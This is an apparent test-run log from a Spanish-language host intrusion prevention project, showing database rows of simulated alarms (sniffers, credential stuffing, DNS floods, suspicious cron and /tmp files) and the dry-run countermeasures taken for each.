+  8 | 2026-06-26 13:24:19.892929 | SNIFFER_DETECTADO             | N/A         | hips
+  7 | 2026-06-26 13:24:19.702105 | ORIGEN_USUARIO_INUSUAL        | 10.10.10.50 | hips
+(20 rows)
+
+
+===== 16. ULTIMAS PREVENCIONES EN POSTGRESQL =====
+could not change directory to "/home/hector/hips-project": Permiso denegado
+ id |         timestamp          |          tipo_alarma          |  ip_origen  |          accion          |                                    resultado                                    
+----+----------------------------+-------------------------------+-------------+--------------------------+---------------------------------------------------------------------------------
+ 26 | 2026-06-26 13:24:21.498686 | MAIL_QUEUE_USUARIO_SOSPECHOSO | N/A         | lock_user                | Usuario no existe en el sistema: spamuser
+ 25 | 2026-06-26 13:24:21.457544 | MAIL_QUEUE_ALTA               | N/A         | stop_service             | DRY RUN: se detendria el servicio postfix
+ 24 | 2026-06-26 13:24:21.285731 | DDOS_DNS_DISTRIBUIDO          | N/A         | stop_service             | DRY RUN: se detendria el servicio named
+ 23 | 2026-06-26 13:24:21.248081 | DDOS_DNS_ANY_FLOOD            | 10.10.10.90 | block_ip                 | DRY RUN: se bloquearia la IP 10.10.10.90
+ 22 | 2026-06-26 13:24:21.207401 | DDOS_DNS_IP_ALTA_FRECUENCIA   | 10.10.10.90 | block_ip                 | DRY RUN: se bloquearia la IP 10.10.10.90
+ 21 | 2026-06-26 13:24:21.169208 | DDOS_DNS_IP_ALTA_FRECUENCIA   | 10.10.10.80 | block_ip                 | DRY RUN: se bloquearia la IP 10.10.10.80
+ 20 | 2026-06-26 13:24:20.996187 | CRON_TAREA_SOSPECHOSA         | N/A         | disable_cron_file        | DRY RUN: se moveria cron sospechoso a cuarentena: /tmp/cron_phase12/payload_job
+ 19 | 2026-06-26 13:24:20.958348 | CRON_ARCHIVO_SOSPECHOSO       | N/A         | disable_cron_file        | DRY RUN: se moveria cron sospechoso a cuarentena: /tmp/cron_phase12/payload_job
+ 18 | 2026-06-26 13:24:20.769817 | PROCESO_TMP_SOSPECHOSO        | N/A         | quarantine_file          | DRY RUN: se moveria a cuarentena /tmp/hips_tmp_phase12/.xpayload123.sh
+ 17 | 2026-06-26 13:24:20.748172 | PROCESO_TMP_SOSPECHOSO        | N/A         | terminate_process        | DRY RUN: se terminaria proceso suspicious PID 4444
+ 16 | 2026-06-26 13:24:20.699057 | ARCHIVO_TMP_SOSPECHOSO        | N/A         | quarantine_file          | DRY RUN: se moveria a cuarentena /tmp/hips_tmp_phase12/.xpayload123.sh
+ 15 | 2026-06-26 13:24:20.508441 | PROCESO_ALTO_CONSUMO          | N/A         | terminate_process        | DRY RUN: se terminaria proceso miner PID 3456
+ 14 | 2026-06-26 13:24:20.469325 | PROCESO_ALTO_CONSUMO          | N/A         | terminate_process        | DRY RUN: se terminaria proceso suspicious PID 1234
+ 13 | 2026-06-26 13:24:20.293026 | ENVIO_MASIVO_MAILS            | N/A         | lock_user                | Usuario no existe en el sistema: spamuser
+ 12 | 2026-06-26 13:24:20.2476   | POSIBLE_SCANNER_HTTP          | 10.10.10.60 | block_ip                 | DRY RUN: se bloquearia la IP 10.10.10.60
+ 11 | 2026-06-26 13:24:20.210073 | CREDENTIAL_STUFFING_DETECTADO | 10.10.10.51 | block_ip                 | DRY RUN: se bloquearia la IP 10.10.10.51
+ 10 | 2026-06-26 13:24:20.171215 | LOG_AUTH_ABUSO                | 10.10.10.51 | block_ip                 | DRY RUN: se bloquearia la IP 10.10.10.51
+  9 | 2026-06-26 13:24:19.986384 | MODO_PROMISCUO_DETECTADO      | N/A         | disable_promiscuous_mode | DRY RUN: se desactivaria modo promiscuo en interfaz enp0s3
+  8 | 2026-06-26 13:24:19.949081 | SNIFFER_DETECTADO             | N/A         | kill_sniffer_process     | DRY RUN: se terminaria proceso sniffer wireshark con PID 3456
+  7 | 2026-06-26 13:24:19.911322 | SNIFFER_DETECTADO             | N/A         | kill_sniffer_process     | DRY RUN: se terminaria proceso sniffer tcpdump con PID 1234
+(20 rows)
+
+
+===== FIN FASE 12 =====
